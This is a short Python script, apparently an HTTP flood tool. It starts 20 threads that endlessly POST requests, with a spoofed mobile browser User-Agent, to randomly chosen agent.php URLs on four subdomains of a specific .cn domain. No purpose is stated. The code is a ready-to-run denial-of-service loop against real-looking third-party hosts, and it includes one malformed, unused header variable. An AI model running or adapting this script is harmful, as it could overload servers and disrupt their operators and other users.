import requests
import threading
import random
def f():
    while True:
        url1 = 'http://gr7vz.sh.spp36kql.cn/agent.php?s=lU7ilFdi4q9RNaHB4b%2BegS%2FHMnpw&key=12'
        url2 = 'http://x6mx0.sh.spp36kql.cn/agent.php?s=lEy1k1QxsvJ2bry0goCegS%2FHMnpw&key=12'
        url3 = 'http://xcjzl.sh.spp36kql.cn/agent.php?s=kh7nwwNm5%2FQJKbvGiYOegS%2FHMnpw&key=12'
        url4 = 'http://xozuz.sh.spp36kql.cn/agent.php?s=lhqxw1Jj4fVPH6nX%2FqeesXrpMEh3&key=12'
        url=[url1,url2,url3,url4]
        headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.4.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/545.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19'}
        headers1 = {'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
        r = requests.post(url[random.randint(0,3)], headers=headers)
        print(r.status_code)

if __name__ == '__main__':
    thread = []

    for i in range(20):
        cnt = threading.Thread(target=f,name=str(i))
        thread.append(cnt)
        cnt.start()